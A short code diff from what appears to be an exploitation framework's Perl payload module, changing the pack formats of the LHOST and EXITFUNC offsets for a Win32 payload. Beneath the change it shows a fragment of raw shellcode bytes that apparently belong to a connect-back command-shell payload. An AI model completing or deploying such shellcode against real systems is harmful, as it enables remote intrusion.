@@ -23,7 +23,7 @@ my $info =
     # win32 specific code
     'Win32Payload' =>
     {
-        Offsets => { 'LPORT' => [164, 'n'], LHOST => [157, 'L'], 'EXITFUNC' => [37, 'L'] },
+        Offsets => { 'LPORT' => [164, 'n'], LHOST => [157, 'V'], 'EXITFUNC' => [37, 'V'] },
         Payload =>
         "\x81\xec\x90\x00\x00\x00\x89\xe5\xe8\x2b\x00\x00\x00\x43\x4d\x44".
         "\x00\xe7\x79\xc6\x79\xec\xf9\xaa\x60\xd9\x09\xf5\xad\xcb\xed\xfc".
